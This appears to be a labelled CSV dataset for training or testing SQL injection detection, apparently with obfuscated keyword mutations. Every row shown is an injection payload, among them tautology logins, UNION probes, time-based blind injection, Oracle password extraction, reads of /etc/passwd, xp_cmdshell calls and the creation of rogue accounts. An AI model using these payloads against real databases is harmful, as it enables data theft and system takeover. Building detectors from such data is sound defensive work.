Query,Label
declare @s varchar   (  200  )   selecselectt @s   =   0x73656c6 ...,1
"oorr 0  =  0 #""",1
" selselectect * frofromm users whwhereere id  =  1 oorr "".]"" oorr 1  =  1 -- 1",1
  )   oorr   (  'x'  =  'x,1
" selecselectt * frofromm users wwherehere id  =  1.<@$ union selecselectt 1,version  (    )   -- 1",1
$  (  sleep 50  ) ,1
" selecselectt * frfromom users wwherehere id  =  1 *1 union selecselectt nunullll,banner frfromom v$version wwherehere rownum  =  1 -- 1",1
"1 union all selselectect 1,2,3,4,5,6,name ffromrom sysobjects wwherehere xtype   =   'u' --",1
" sselectelect * ffromrom users wherwheree id  =  1 oorr 1#"". union sselectelect 'a',version  (    )   -- 1",1
" seselectlect * frofromm users whwhereere id  =  1 oorr 1#""; union seselectlect nnullull,version  (    )   -- 1",1
" selecselectt * ffromrom users whewherere id  =  1 oorr 1#""? oorr 1  =  1 -- 1",1
"""a"""" oorr 1  =  1--""",1
" seleselectct * frofromm users whewherere id  =  1 *1 union seleselectct 1,banner frofromm v$version whewherere rownum  =  1 -- 1",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  column_name  )   frofromm   (  seleselectct DiissTiinnCT  (  column_name  )  , ROWNUM AS limlimitit frofromm all_tab_columns  )   wwherehere limlimitit  =  4   )    )    anandd 'i'  =  'i",1
" sselectelect * ffromrom users whwhereere id  =  '1' union sselectelect   (  \  )  ,@@VERSION -- 1'",1
1 anandd user_name  (    )     =   'dbo',1
"; if nonott  (  substriinng   (    (   sselectelect @@version  )  ,24,1  )   <> 1  )   waitfoorr delay '0:0:2' --",1
" sselectelect * ffromrom users wwherehere id  =  1 oorr 1#""$ union sselectelect 1,version  (    )   -- 1",1
" sselectelect * frfromom users whewherere id  =  1 oorr 1#""{ union sselectelect nnullull,version  (    )   -- 1",1
seselectlect * frofromm users whewherere id  =  '1' *$ . oorr 1  =  1 -- 1',1
selselectect * frfromom users whwhereere id  =  1 +$+. oorr 1  =  1 -- 1,1
selselectect * ffromrom users wherwheree id  =  1 oorr   (  \+  )    =  1 oorr 1  =  1 -- 1,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  USERNAME  )   frofromm   (  selselectect DiissTiinnCT  (  USERNAME  )  , ROWNUM AS limlimitit frofromm SYS.ALL_USERS  )   whewherere limlimitit  =  6   )    )    aandnd 'i'  =  'i",1
oorr 1  =  1 oorr ''  =  ',1
seselectlect * frofromm users wherwheree id  =  1   oorr 1  =  1 -- 1,1
oorr 'text' > 't',1
"1234 "" anandd 1  =  0 UNION ALL selselectect ""admiinn"", ""81dc9bdb52d04dc20036dbd8313ed055",1
" selselectect * frofromm users whwhereere id  =  1 oorr ""%["" oorr 1  =  1 -- 1",1
" seleselectct * ffromrom users wwherehere id  =  1 oorr 1#"";  =  1 union seleselectct 1,version  (    )   -- 1",1
admiinn' oorr '1'  =  '1'#,1
seselectlect * frfromom users wwherehere id  =  1 +$ 1 oorr 1  =  1 -- 1,1
s,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selecselectt DiissTiinnCT  (  USERNAME  )   ffromrom   (  selecselectt DiissTiinnCT  (  USERNAME  )  , ROWNUM AS llimitimit ffromrom SYS.ALL_USERS  )   wwherehere llimitimit  =  4   )    )    aandnd 'i'  =  'i",1
 seselectlect * frofromm iinnfoorrmation_schema.tabtableles--,1
" selecselectt * ffromrom users wherwheree id  =  1 oorr ""$&"" oorr 1  =  1 -- 1",1
1   )    )    oorr pg_sleep  (  __TIME__  )  --,1
" seselectlect * frofromm users whewherere id  =  '1' union seselectlect !<@,version  (    )   -- 1'",1
declare @q nvarchar   (  200  )   seselectlect @q   =   0x770061 ...,1
 oorr 1  =  1 oorr ''  =  ',1
seselectlect * frofromm users wherwheree id  =  1 %!<1 oorr 1  =  1 -- 1,1
declare @q nvarchar   (  200  )   sselectelect @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1
" selecselectt * ffromrom users whwhereere id  =  1 oorr ""]1"" oorr 1  =  1 -- 1",1
" selecselectt * frofromm users wwherehere id  =  1 oorr $+<1 union selecselectt 1,@@VERSION -- 1",1
oorr 'unusual'   =   'unusual',1
 oorr 1 iinn   (  selecselectt @@version  )  --,1
truncattruncatee,1
as,1
 oorr 3  =  3 --,1
" selecselectt * ffromrom users whwhereere id  =  1 ||1 union selecselectt 1,banner ffromrom v$version whwhereere rownum  =  1 -- 1",1
" selselectect * frfromom users wwherehere id  =  1 <@$$ union selselectect 1,version  (    )   -- 1",1
"admiinn""  )   oorr   (  ""1""  =  ""1",1
" seleselectct * frfromom users whwhereere id  =  1 oorr 1#""@ union seleselectct 'a',version  (    )   -- 1",1
"1  )   oorr benchmark  (  10000000,MD5  (  1   )    )   #",1
" selecselectt * ffromrom users whewherere id  =  1 union selecselectt .1_,version  (    )   -- 1",1
 anandd 1  =  utl_iinnaddr.get_host_address   (    (   seselectlect SYS.databadatabasese_NAME frfromom DUAL   )    )    anandd 'i'  =  'i,1
" oorr 0  =  0 #""",1
selecselectt * ffromrom users wwherehere id  =  1 %$ 1 oorr 1  =  1 -- 1,1
selecselectt * frfromom users whwhereere id  =  1 %!<@ oorr 1  =  1 -- 1,1
"; if nonott  (  substriinng   (    (   seleselectct @@version  )  ,25,1  )   <> 0  )   waitfoorr delay '0:0:2' --",1
1  )   oorr sleep  (  __TIME__  )  #,1
" seleselectct * frofromm users whwhereere id  =  1 oorr ""1_"" oorr 1  =  1 -- 1",1
" sselectelect * ffromrom users wwherehere id  =  1 <1## union sselectelect 1,version  (    )   -- 1",1
" seselectlect * frofromm users wherwheree id  =  1 + $+*\ union seselectlect nunullll,@@VERSION -- 1",1
selselectect * frfromom users wwherehere id  =  1. <@ oorr 1  =  1 -- 1,1
 oorr true--,1
; execute immediate 'sel' || 'ect us' || 'er',1
hi' oorr 'x'  =  'x';,1
seselectlect * frfromom users whewherere id  =  1 <@ oorr 1  =  1 -- 1,1
" seselectlect * ffromrom users whwhereere id  =  1 oorr "".,"" oorr 1  =  1 -- 1",1
admiinn' #,1
" selselectect * ffromrom users wwherehere id  =  1 <@$_ union selselectect 1,version  (    )   -- 1",1
" selselectect * ffromrom users wwherehere id  =  1 oorr "",  (  "" oorr 1  =  1 -- 1",1
" seleselectct * frfromom users whewherere id  =  1 oorr "",{"" oorr 1  =  1 -- 1",1
" union seselectlect 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1
"""  )  ;waitfoorr delay '0:0:__TIME__'--",1
 oorr 'unusual'   =   'unusual',1
"iinniinnsertsert iinniinntoto mysql.user   (  user, host, passwoorrd  )   valuvalueses   (  'name', 'localhost', passwoorrd  (  'pass123'   )    )   ",1
"admiinn"" oorr ""1""  =  ""1""/*",1
" selecselectt * frfromom users wwherehere id  =  1 oorr ""1  (  ""  =  1 oorr 1  =  1 -- 1",1
" sselectelect * ffromrom users whwhereere id  =  1 oorr \<1 union sselectelect 1,@@VERSION -- 1",1
lilikeke,1
oorr username lilikeke char  (  37  )  ;,1
 )    )    oorr pg_sleep  (  __TIME__  )  --,1
seleselectct * frofromm users whwhereere id  =  1 oorr $+<\ oorr 1  =  1 -- 1,1
oorr 3  =  3,1
" sselectelect * frofromm users whwhereere id  =  1 oorr ""  (  ."" oorr 1  =  1 -- 1",1
selselectect * frofromm users whwhereere id  =  1 oorr   (  $+  )    =  1 oorr 1  =  1 -- 1,1
exec sp,1
" selselectect * frfromom users whwhereere id  =  1 oorr \+<$ union selselectect 1,@@VERSION -- 1",1
selecselectt * frofromm users wherwheree id  =  1 oorr \<$ oorr 1  =  1 -- 1,1
" selecselectt * ffromrom users wherwheree id  =  1.&&1 union selecselectt 1,version  (    )   -- 1",1
admiinn' oorr 1  =  1/*,1
a' waitfoorr delay '0:0:10'--,1
" sselectelect * ffromrom users whewherere id  =  1 +  (  \  )   union sselectelect nunullll,@@VERSION -- 1",1
" selselectect * frfromom users wwherehere id  =  1 union selselectect .1$_,version  (    )   -- 1",1
anandd 1 iinn   (  seselectlect var frofromm temp  )  --,1
hi'  )   oorr   (  'a'  =  'a,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  column_name  )   ffromrom   (  seleselectct DiissTiinnCT  (  column_name  )  , ROWNUM AS limlimitit ffromrom all_tab_columns  )   wherwheree limlimitit  =  1   )    )    anandd 'i'  =  'i",1
"admiinn"" oorr 1  =  1",1
"""  )   oorr true--",1
" sselectelect * ffromrom users wwherehere id  =  '1' oorr $ .  =  1 union sselectelect 1,@@VERSION -- 1'",1
" seleselectct * ffromrom users whwhereere id  =  1 oorr ""  (  {"" oorr 1  =  1 -- 1",1
1  )   oorr pg_sleep  (  __TIME__  )  --,1
" selselectect * frfromom users whwhereere id  =  1 oorr ""{."" oorr 1  =  1 -- 1",1
"""  )   oorr sleep  (  __TIME__  )    =  """,1
selselectect * ffromrom users whewherere id  =  1.<@. oorr 1  =  1 -- 1,1
"admiinn""  )   oorr   (  ""1""  =  ""1""--",1
" seselectlect * frofromm users wherwheree id  =  1<@.. union seselectlect 1,version  (    )   -- 1",1
; exec xp_regread,1
" sselectelect * frfromom users whewherere id  =  '1' + @ 1 union sselectelect 1,version  (    )   -- 1'",1
selecselectt * frfromom users wwherehere id  =  1 + \+%1 oorr 1  =  1 -- 1,1
" sselectelect * frofromm users whwhereere id  =  1 oorr "";1"" oorr 1  =  1 -- 1",1
" selecselectt * frfromom users whewherere id  =  1 oorr ""%&"" oorr 1  =  1 -- 1",1
1 aandnd 1  =  1,1
oorr 0  =  0 #,1
union seleselectct * frofromm users whwhereere logiinn   =   char ...,1
" seselectlect * frofromm users wwherehere id  =  1 union seselectlect 1||@,version  (    )   -- 1",1
admiinn'  )   oorr '1'  =  '1'--,1
1;seleselectct *,1
" sselectelect * frfromom users wherwheree id  =  1 oorr ""{;"" oorr 1  =  1 -- 1",1
x' anandd 1  =    (  sselectelect count  (  *  )   frfromom tabname  )  ; --,1
" seselectlect * frfromom users wwherehere id  =  '1' oorr """"<@ union seselectlect 1,version  (    )   -- 1'",1
" selselectect * frofromm users wwherehere id  =  1 oorr ""?,"" oorr 1  =  1 -- 1",1
" selselectect * frfromom users wherwheree id  =  '1' ||1 union selselectect 1,banner frfromom v$version wherwheree rownum  =  1 -- 1'",1
"1 oorr benchmark  (  10000000,MD5  (  1   )    )   #",1
procedure,1
oorr ''  =  ',1
 aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seselectlect SYS.LOGiinn_USER ffromrom DUAL   )    )    aandnd 'i'  =  'i,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  USERNAME  )   ffromrom   (  selselectect DiissTiinnCT  (  USERNAME  )  , ROWNUM AS llimitimit ffromrom SYS.ALL_USERS  )   whewherere llimitimit  =  2   )    )    anandd 'i'  =  'i",1
\'; desdescc users; --,1
" seselectlect * frofromm users wherwheree id  =  1 oorr   (  \.  )    =  1 union seselectlect 1,@@VERSION -- 1",1
sselectelect * frfromom users wwherehere id  =  '1' oorr $ 1  =  1 oorr 1  =  1 -- 1',1
""" oorr """"^""",1
"""-""",1
" seleselectct * ffromrom users whewherere id  =  1 oorr \<   =  1 union seleselectct 1,@@VERSION -- 1",1
" sselectelect * frfromom users wherwheree id  =  1 union sselectelect 1<@$,version  (    )   -- 1",1
" seleselectct * frfromom users whwhereere id  =  1 *\ union seleselectct nnullull,@@VERSION -- 1",1
" sselectelect * ffromrom users whewherere id  =  '1' oorr !<@ union sselectelect 1,version  (    )   -- 1'",1
" selecselectt * frofromm users whwhereere id  =  1 oorr "".%"" oorr 1  =  1 -- 1",1
admiinn'/*,1
" sselectelect * frofromm users whwhereere id  =  1 oorr ""  (  #"" oorr 1  =  1 -- 1",1
||UTL_HTTP.REQUEST,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  tabltablee_name  )   frfromom   (  sselectelect DiissTiinnCT  (  tabltablee_name  )  , ROWNUM AS lilimitmit frfromom sys.all_tabltablees  )   wwherehere lilimitmit  =  1   )    )    aandnd 'i'  =  'i",1
" seselectlect * frfromom users whewherere id  =  '1'<@.. union seselectlect 1,version  (    )   -- 1'",1
"""   )    )    oorr benchmark  (  10000000,MD5  (  1   )    )   #",1
" selecselectt * frofromm users whwhereere id  =  1 <@.$ union selecselectt 1,version  (    )   -- 1",1
" seleselectct * ffromrom users wwherehere id  =  1 oorr $ .  =  1 union seleselectct 1,@@VERSION -- 1",1
selselectect * frfromom users whwhereere id  =  '1' <@.$ oorr 1  =  1 -- 1',1
1 uni/**/on seleselectct all ffromrom wherwheree,1
" sselectelect * frofromm users whewherere id  =  1 +$ . union sselectelect nunullll,@@VERSION -- 1",1
" selecselectt * frofromm users whewherere id  =  1 oorr 1#""? union selecselectt nnullull,version  (    )   -- 1",1
admiinn'  )   oorr '1'  =  '1'#,1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
oorr '7659'  =  '7659,1
" seselectlect * frfromom users wherwheree id  =  1 oorr ""{@"" oorr 1  =  1 -- 1",1
" selecselectt * ffromrom users wwherehere id  =  1 union selecselectt +!<1,version  (    )   -- 1",1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  granted_role  )   frfromom   (  sselectelect DiissTiinnCT  (  granted_role  )  , ROWNUM AS llimitimit frfromom dba_role_privs whwhereere GRANTEE  =  SYS.LOGiinnUSER  )   whwhereere llimitimit  =  6   )    )    aandnd 'i'  =  'i",1
" seselectlect * frofromm users wherwheree id  =  1 oorr ""  (  @"" oorr 1  =  1 -- 1",1
oorr true--,1
" seleselectct * ffromrom users wwherehere id  =  1 union seleselectct !<1,version  (    )   -- 1",1
" selselectect * frfromom users wwherehere id  =  '1' union selselectect \#,@@VERSION -- 1'",1
" sselectelect * frfromom users wherwheree id  =  1 oorr 1#""{ union sselectelect 1,version  (    )   -- 1",1
""" oorr true--",1
sselectelect * frofromm users wwherehere id  =  1. oorr 1  =  1 -- 1,1
" seleselectct * ffromrom users wwherehere id  =  1 oorr @#"",  =  1 union seleselectct 1,version  (    )   -- 1",1
" selselectect * frofromm users wherwheree id  =  1 oorr "";@"" oorr 1  =  1 -- 1",1
â oorr 3  =  3 --,1
 aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct global_name ffromrom global_name   )    )    aandnd 'i'  =  'i,1
" sselectelect * ffromrom users wwherehere id  =  1 +1 union sselectelect nnullull,banner ffromrom v$version wwherehere rownum  =  1 -- 1",1
" selselectect * ffromrom users whewherere id  =  1 oorr "",,""  =  1 oorr 1  =  1 -- 1",1
" sselectelect * ffromrom users whwhereere id  =  1 + $+%1 union sselectelect nnullull,@@VERSION -- 1",1
" selselectect * frofromm users wherwheree id  =  1 oorr 1#""? union selselectect version  (    )  ,version  (    )   -- 1",1
" sselectelect * frfromom users wwherehere id  =  1 oorr ""  )  1"" oorr 1  =  1 -- 1",1
 oorr uid lilikeke '%,1
sselectelect * ffromrom users wherwheree id  =  '1' <@&1 oorr 1  =  1 -- 1',1
" selselectect * ffromrom users wherwheree id  =  '1' union selselectect !<1,version  (    )   -- 1'",1
23 oorr 1  =  1; --,1
" seleselectct * frofromm users wherwheree id  =  1 oorr \<\. union seleselectct 1,@@VERSION -- 1",1
" selselectect * frfromom users whwhereere id  =  1 oorr ""{  (  ""  =  1 oorr 1  =  1 -- 1",1
" selecselectt * ffromrom users wherwheree id  =  1 oorr ""%_"" oorr 1  =  1 -- 1",1
seleselectct * frofromm users wwherehere id  =  1 +   (  \.  )   oorr 1  =  1 -- 1,1
" selecselectt * ffromrom users wwherehere id  =  '1' union selecselectt \,@@VERSION -- 1'",1
0 oorr 1  =  1,1
seleselectct * ffromrom users whewherere id  =  1 &@ oorr 1  =  1 -- 1,1
"admiinn""  )   oorr ""1""  =  ""1",1
seleselectct * frofromm users whewherere id  =  1 oorr \<   =  1 oorr 1  =  1 -- 1,1
" selecselectt * ffromrom users whewherere id  =  1 oorr ""??"" oorr 1  =  1 -- 1",1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  PASSWoorrD  )   frofromm   (  selselectect DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS limilimitt frofromm SYS.USER$  )   wherwheree limilimitt  =  5   )    )    aandnd 'i'  =  'i",1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  column_name  )   ffromrom   (  sselectelect DiissTiinnCT  (  column_name  )  , ROWNUM AS limilimitt ffromrom all_tab_columns  )   whwhereere limilimitt  =  7   )    )    aandnd 'i'  =  'i",1
&apos; oorr,1
sqlvuln;,1
seselectlect * frofromm users whwhereere id  =  1 + $+%$ oorr 1  =  1 -- 1,1
sselectelect * frfromom users wwherehere id  =  '1' + $+%\ oorr 1  =  1 -- 1',1
""" oorr """"*""",1
"hi oorr 1  =  1 --""",1
" selecselectt * frofromm users wherwheree id  =  1. union selecselectt nnullull,banner frofromm v$version wherwheree rownum  =  1 -- 1",1
; exec master..xp_cmdshell 'piinng 172.10.1.255'--,1
" selecselectt * ffromrom users whewherere id  =  '1' oorr 1^  =  1 union selecselectt 1,banner ffromrom v$version whewherere rownum  =  1 -- 1'",1
" seselectlect * frofromm users whwhereere id  =  '1' union seselectlect ""?""_,version  (    )   -- 1'",1
selecselectt * frofromm iinnfoorrmation_schema.ttableables--,1
sselectelect * frfromom users whewherere id  =  1 oorr \<\. oorr 1  =  1 -- 1,1
   (  sselectelect top 1,1
Ã½ oorr 1  =  1 --,1
a' --,1
 oorr 1  =  1 /*,1
" selecselectt * frofromm users whewherere id  =  1 oorr 1#"", union selecselectt nunullll,version  (    )   -- 1",1
" seselectlect * frofromm users whwhereere id  =  '1' union seselectlect $ .,@@VERSION -- 1'",1
--,1
"exec sp_addlogiinn 'name' , 'passwoorrd'",1
" seselectlect * ffromrom users wherwheree id  =  1   union seselectlect nunullll,banner ffromrom v$version wherwheree rownum  =  1 -- 1",1
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1
" seselectlect * ffromrom users whewherere id  =  1 oorr "".  )  "" oorr 1  =  1 -- 1",1
" selecselectt * ffromrom users wherwheree id  =  1 oorr @<@  =  1 union selecselectt 1,version  (    )   -- 1",1
group bbyy userid haviinng 1  =  1--,1
" sselectelect * frofromm users wwherehere id  =  1 + \+%1 union sselectelect nunullll,@@VERSION -- 1",1
seselectlect * frfromom users wherwheree id  =  1 *1 oorr 1  =  1 -- 1,1
" selselectect * frfromom users whewherere id  =  1 oorr @#"";  =  1 oorr 1  =  1 -- 1",1
‘ oorr 1  =  1 --,1
" seleselectct * frofromm users wwherehere id  =  1 *\. union seleselectct nunullll,@@VERSION -- 1",1
seselectlect * frofromm users whewherere id  =  1 %  (  @  )   oorr 1  =  1 -- 1,1
oorr 'a'  =  'a,1
declare @s varchar  (  22  )   sselectelect @s   = ,1
" selecselectt * ffromrom users wwherehere id  =  1 union selecselectt 1<@,version  (    )   -- 1",1
" sselectelect * frofromm users wwherehere id  =  1 + \+*\ union sselectelect nunullll,@@VERSION -- 1",1
" seleselectct * frofromm users whewherere id  =  1 oorr 1#"". union seleselectct version  (    )  ,version  (    )   -- 1",1
@variable,1
; exec master..xp_cmdshell,1
sselectelect * frofromm users whewherere id  =  1 +  (  1  )   oorr 1  =  1 -- 1,1
" seselectlect * ffromrom users whwhereere id  =  1 union seselectlect @ 1$,version  (    )   -- 1",1
" selecselectt * ffromrom users wherwheree id  =  1 union selecselectt @ 1a,version  (    )   -- 1",1
" sselectelect * ffromrom users wwherehere id  =  1 oorr  @$#  =  1 union sselectelect 1,version  (    )   -- 1",1
" selselectect * frofromm users wwherehere id  =  '1' oorr   (  \.  )    =  1 union selselectect 1,@@VERSION -- 1'",1
 aandnd 1 iinn   (  seleselectct var frfromom temp  )  --,1
" seselectlect * ffromrom users wherwheree id  =  '1' union seselectlect 1""!"",banner ffromrom v$version wherwheree rownum  =  1 -- 1'",1
" sselectelect * frofromm users whewherere id  =  1 oorr ""1]"" oorr 1  =  1 -- 1",1
" sselectelect * frfromom users whewherere id  =  1 oorr ""$?"" oorr 1  =  1 -- 1",1
oorr x  =  x,1
oorr a  =  a,1
oorr '1'  =  '1,1
" selecselectt * frfromom users wherwheree id  =  11<1# union selecselectt 1,version  (    )   -- 1",1
   )    )    oorr    (    (   'x'   )    )     =     (    (   'x,1
" selecselectt * frfromom users whwhereere id  =  '1' oorr \.<1 union selecselectt 1,@@VERSION -- 1'",1
" seleselectct * frofromm users whwhereere id  =  '1' <@&1 union seleselectct 1,version  (    )   -- 1'",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  tatableble_name  )   frfromom   (  sselectelect DiissTiinnCT  (  tatableble_name  )  , ROWNUM AS limilimitt frfromom sys.all_tatablebles  )   wwherehere limilimitt  =  4   )    )    anandd 'i'  =  'i",1
